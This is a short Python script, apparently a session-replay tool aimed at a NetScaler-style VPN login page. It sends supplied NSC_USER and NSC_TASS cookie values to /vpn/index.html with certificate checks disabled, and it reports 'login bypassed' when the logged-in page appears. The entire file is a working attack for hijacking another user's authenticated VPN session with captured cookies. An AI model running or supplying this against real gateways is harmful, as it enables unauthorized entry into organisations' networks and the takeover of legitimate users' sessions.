import requests
import sys
import urllib3

urllib3.disable_warnings()

def validate_session(target, cookie_dict):
    url = target.rstrip("/") + "/vpn/index.html"

    try:
        r = requests.get(url, cookies=cookie_dict, verify=False, timeout=8)
        if "Log Off" in r.text or "Welcome" in r.text:
            print("[+] Session replay successful: login bypassed!")
        else:
            print("[-] Session invalid or expired.")
    except Exception as e:
        print(f"[-] Failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} https://target NSC_USER_val NSC_TASS_val")
        sys.exit(1)

    cookie = {
        "NSC_USER": sys.argv[2],
        "NSC_TASS": sys.argv[3]
    }

    validate_session(sys.argv[1], cookie)
